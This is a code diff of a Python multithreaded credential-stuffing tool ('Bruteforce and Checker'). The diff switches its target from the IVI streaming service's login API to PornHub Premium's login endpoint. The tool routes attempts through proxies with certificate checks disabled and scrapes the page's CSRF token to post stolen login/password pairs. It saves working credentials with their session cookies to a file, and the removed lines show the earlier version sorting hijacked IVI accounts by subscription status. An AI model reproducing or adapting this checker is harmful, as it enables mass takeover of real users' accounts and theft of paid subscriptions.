@@ -3,7 +3,9 @@ import sys, os
 import random
 import threading
 import time
-from colors import bcolors
+from mechanic.colors import bcolors
+from bs4 import BeautifulSoup as soup
+
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -12,50 +14,43 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 class Brute(object):
     def __init__(self):
-        self.projectName = "IVI"
-        self.projectFullName = "IVI Bruteforce and Checker"
+        self.projectName = "PornHub"
+        self.projectFullName = "PornHub Bruteforce and Checker"
         self.description = "Some desc is here"
         self.good = 0
         self.bad = 0 
         self.error = 0
         self.captcha = 0
         self.running = True
+        self.timeout = 15
         self.thread_count = 150
         self.lines = []
         self.lock = threading.Lock()
         self.count_list = 0
 
     def check(self, login, password):
-        proxies = {
-            'https': self.getproxy()
-            #BURP
-            #'https': '127.0.0.1:8080'
-        }
-        body = {'user_ab_bucket' : '1927', 'password': password, 'device' : 'Apple%20iPhone', 'app_version' : '25641', 'email' : login}
         try:
-            r = requests.post("https://api.ivi.ru/mobileapi/user/login/ivi/v6/", data=body, proxies=proxies, verify=False)
-            if 'incorrect login or password' in r.text:
+            proxies = {
+                'https': self.getproxy()
+                #BURP
+                #'https': '127.0.0.1:8080'
+            }
+            r = requests.get("https://rt.pornhubpremium.com/premium/login", proxies=proxies, verify=False, timeout=self.timeout)
+            site = soup(r.text, "html.parser")
+            token = site.find("input", id="token")
+            body = {'username' : login, 'password': password, 'remember_me' : 'on', 'token' : str(token['value']), 'redirect' : '', 'from' : 'pc_premium_login', 'segment':'straight'}
+            r = requests.post("https://rt.pornhubpremium.com/front/authenticate", data=body, proxies=proxies, verify=False, timeout=self.timeout)
+            
+            if r.json()['success'] == "0":
                 self.bad += 1
-            elif 'session' in r.text:
-                session = r.json()['result']['session']
-                r = requests.get("https://api.ivi.ru/mobileapi/billing/v1/subscription/info/?app_version=870&session=" + session, proxies=proxies, verify=False)
-                if len(r.json()['result']) > 0:
-                    if r.json()['result']['expired'] == False:
-                        if r.json()['result']['renew_enabled'] == True:
-                            self.writelog("autorenew.txt", login + ":" + password + "|" + str(r.json()['result']['finish_time']).split('T')[0] + "| Autorenew")
-                            self.good += 1
-
-                        else :
-                            self.writelog("noautorenew.txt", login + ":" + password + "|" + str(r.json()['result']['finish_time']).split('T')[0])
-                            self.good += 1
-                    else:
-                        self.bad += 1
-                else:
-                    self.bad += 1
+            elif r.json()['success'] == "1":
+                self.writelog("good.txt", login + ":" + password + "|" + str(r.json()['premium_redirect_cookie']))
+                self.good += 1
                 #return login + ":" + password + "|" + str(r.json()['result']['basic']) + "|" + str(r.json()['result']['bonus'])
             else :
                 self.error += 1
         except Exception as e:
+            #print("Error is " + str(e))
             self.error += 1
     
     def stop(self):
